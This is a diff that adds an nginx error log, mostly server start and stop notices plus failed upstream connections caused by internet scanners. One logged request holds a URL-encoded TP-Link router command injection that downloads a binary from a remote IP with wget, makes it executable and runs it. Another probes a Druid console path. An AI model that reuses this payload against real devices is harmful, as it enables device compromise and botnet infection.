@@ -1,0 +1,109 @@
+2024/08/02 11:21:44 [notice] 1#1: using the "epoll" event method
+2024/08/02 11:21:44 [notice] 1#1: nginx/1.27.0
+2024/08/02 11:21:44 [notice] 1#1: built by gcc 13.2.1 20231014 (Alpine 13.2.1_git20231014) 
+2024/08/02 11:21:44 [notice] 1#1: OS: Linux 5.15.0-117-generic
+2024/08/02 11:21:44 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/08/02 11:21:44 [notice] 1#1: start worker processes
+2024/08/02 11:21:44 [notice] 1#1: start worker process 20
+2024/08/02 11:21:44 [notice] 1#1: start worker process 21
+2024/08/02 11:21:44 [notice] 1#1: start worker process 22
+2024/08/02 11:21:44 [notice] 1#1: start worker process 23
+2024/08/02 11:21:44 [notice] 1#1: start worker process 24
+2024/08/02 11:21:44 [notice] 1#1: start worker process 25
+2024/08/02 11:23:20 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/08/02 11:23:20 [notice] 20#20: gracefully shutting down
+2024/08/02 11:23:20 [notice] 20#20: exiting
+2024/08/02 11:23:20 [notice] 20#20: exit
+2024/08/02 11:23:20 [notice] 23#23: gracefully shutting down
+2024/08/02 11:23:20 [notice] 23#23: exiting
+2024/08/02 11:23:20 [notice] 23#23: exit
+2024/08/02 11:23:20 [notice] 25#25: gracefully shutting down
+2024/08/02 11:23:20 [notice] 25#25: exiting
+2024/08/02 11:23:20 [notice] 25#25: exit
+2024/08/02 11:23:20 [notice] 22#22: gracefully shutting down
+2024/08/02 11:23:20 [notice] 22#22: exiting
+2024/08/02 11:23:20 [notice] 22#22: exit
+2024/08/02 11:23:20 [notice] 24#24: gracefully shutting down
+2024/08/02 11:23:20 [notice] 24#24: exiting
+2024/08/02 11:23:20 [notice] 24#24: exit
+2024/08/02 11:23:20 [notice] 21#21: gracefully shutting down
+2024/08/02 11:23:20 [notice] 21#21: exiting
+2024/08/02 11:23:20 [notice] 21#21: exit
+2024/08/02 11:23:20 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2024/08/02 11:23:20 [notice] 1#1: worker process 21 exited with code 0
+2024/08/02 11:23:20 [notice] 1#1: signal 29 (SIGIO) received
+2024/08/02 11:23:20 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2024/08/02 11:23:20 [notice] 1#1: worker process 22 exited with code 0
+2024/08/02 11:23:20 [notice] 1#1: signal 29 (SIGIO) received
+2024/08/02 11:23:20 [notice] 1#1: signal 17 (SIGCHLD) received from 23
+2024/08/02 11:23:20 [notice] 1#1: worker process 23 exited with code 0
+2024/08/02 11:23:20 [notice] 1#1: signal 29 (SIGIO) received
+2024/08/02 11:23:20 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/08/02 11:23:20 [notice] 1#1: worker process 20 exited with code 0
+2024/08/02 11:23:20 [notice] 1#1: signal 29 (SIGIO) received
+2024/08/02 11:23:20 [notice] 1#1: signal 17 (SIGCHLD) received from 25
+2024/08/02 11:23:20 [notice] 1#1: worker process 25 exited with code 0
+2024/08/02 11:23:20 [notice] 1#1: signal 29 (SIGIO) received
+2024/08/02 11:23:20 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2024/08/02 11:23:20 [notice] 1#1: worker process 24 exited with code 0
+2024/08/02 11:23:20 [notice] 1#1: exit
+2024/08/08 13:49:49 [notice] 1#1: using the "epoll" event method
+2024/08/08 13:49:49 [notice] 1#1: nginx/1.27.0
+2024/08/08 13:49:49 [notice] 1#1: built by gcc 13.2.1 20231014 (Alpine 13.2.1_git20231014) 
+2024/08/08 13:49:49 [notice] 1#1: OS: Linux 5.15.0-117-generic
+2024/08/08 13:49:49 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/08/08 13:49:49 [notice] 1#1: start worker processes
+2024/08/08 13:49:49 [notice] 1#1: start worker process 20
+2024/08/08 13:49:49 [notice] 1#1: start worker process 21
+2024/08/08 13:49:49 [notice] 1#1: start worker process 22
+2024/08/08 13:49:49 [notice] 1#1: start worker process 23
+2024/08/08 13:49:49 [notice] 1#1: start worker process 24
+2024/08/08 13:49:49 [notice] 1#1: start worker process 25
+2024/08/08 14:01:08 [error] 20#20: *1 connect() failed (113: Host is unreachable) while connecting to upstream, client: 185.191.126.213, server: ${domain}, request: "GET / HTTP/1.1", upstream: "http://172.20.0.7:8065/", host: "94.72.127.228:80"
+2024/08/08 14:19:42 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/08/08 14:19:42 [notice] 23#23: gracefully shutting down
+2024/08/08 14:19:42 [notice] 25#25: gracefully shutting down
+2024/08/08 14:19:42 [notice] 21#21: gracefully shutting down
+2024/08/08 14:19:42 [notice] 25#25: exiting
+2024/08/08 14:19:42 [notice] 23#23: exiting
+2024/08/08 14:19:42 [notice] 21#21: exiting
+2024/08/08 14:19:42 [notice] 22#22: gracefully shutting down
+2024/08/08 14:19:42 [notice] 25#25: exit
+2024/08/08 14:19:42 [notice] 23#23: exit
+2024/08/08 14:19:42 [notice] 22#22: exiting
+2024/08/08 14:19:42 [notice] 21#21: exit
+2024/08/08 14:19:42 [notice] 22#22: exit
+2024/08/08 14:19:42 [notice] 24#24: gracefully shutting down
+2024/08/08 14:19:42 [notice] 24#24: exiting
+2024/08/08 14:19:42 [notice] 24#24: exit
+2024/08/08 14:19:42 [notice] 20#20: gracefully shutting down
+2024/08/08 14:19:42 [notice] 20#20: exiting
+2024/08/08 14:19:42 [notice] 20#20: exit
+2024/08/08 14:19:42 [notice] 1#1: signal 17 (SIGCHLD) received from 24
+2024/08/08 14:19:42 [notice] 1#1: worker process 21 exited with code 0
+2024/08/08 14:19:42 [notice] 1#1: worker process 22 exited with code 0
+2024/08/08 14:19:42 [notice] 1#1: worker process 24 exited with code 0
+2024/08/08 14:19:42 [notice] 1#1: worker process 25 exited with code 0
+2024/08/08 14:19:42 [notice] 1#1: signal 29 (SIGIO) received
+2024/08/08 14:19:42 [notice] 1#1: signal 17 (SIGCHLD) received from 20
+2024/08/08 14:19:42 [notice] 1#1: worker process 20 exited with code 0
+2024/08/08 14:19:42 [notice] 1#1: worker process 23 exited with code 0
+2024/08/08 14:19:42 [notice] 1#1: exit
+2024/08/08 14:26:31 [notice] 1#1: using the "epoll" event method
+2024/08/08 14:26:31 [notice] 1#1: nginx/1.27.0
+2024/08/08 14:26:31 [notice] 1#1: built by gcc 13.2.1 20231014 (Alpine 13.2.1_git20231014) 
+2024/08/08 14:26:31 [notice] 1#1: OS: Linux 5.15.0-117-generic
+2024/08/08 14:26:31 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/08/08 14:26:31 [notice] 1#1: start worker processes
+2024/08/08 14:26:31 [notice] 1#1: start worker process 20
+2024/08/08 14:26:31 [notice] 1#1: start worker process 21
+2024/08/08 14:26:31 [notice] 1#1: start worker process 22
+2024/08/08 14:26:31 [notice] 1#1: start worker process 23
+2024/08/08 14:26:31 [notice] 1#1: start worker process 24
+2024/08/08 14:26:31 [notice] 1#1: start worker process 25
+2024/08/08 14:27:30 [notice] 1#1: signal 28 (SIGWINCH) received
+2024/08/08 14:36:27 [error] 21#21: *1 connect() failed (113: Host is unreachable) while connecting to upstream, client: 52.228.153.100, server: ${domain}, request: "GET /druid/index.html HTTP/1.1", upstream: "http://172.20.0.7:8065/druid/index.html", host: "94.72.127.228"
+2024/08/08 14:48:23 [error] 20#20: *3 connect() failed (113: Host is unreachable) while connecting to upstream, client: 149.50.103.48, server: ${domain}, request: "GET / HTTP/1.1", upstream: "http://172.20.0.7:8065/", host: "94.72.127.228:80"
+2024/08/08 14:57:26 [error] 23#23: *5 connect() failed (113: Host is unreachable) while connecting to upstream, client: 154.213.187.96, server: ${domain}, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F45.66.231.213%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1", upstream: "http://172.20.0.7:8065/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F45.66.231.213%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60)", host: "94.72.127.228:80"
+2024/08/08 15:01:56 [error] 22#22: *8 connect() failed (113: Host is unreachable) while connecting to upstream, client: 167.94.145.98, server: ${domain}, request: "GET / HTTP/1.1", upstream: "http://172.20.0.7:8065/", host: "94.72.127.228:80"
+2024/08/08 15:02:05 [error] 25#25: *10 connect() failed (113: Host is unreachable) while connecting to upstream, client: 167.94.145.98, server: ${domain}, request: "GET / HTTP/1.1", upstream: "http://172.20.0.7:8065/", host: "94.72.127.228"
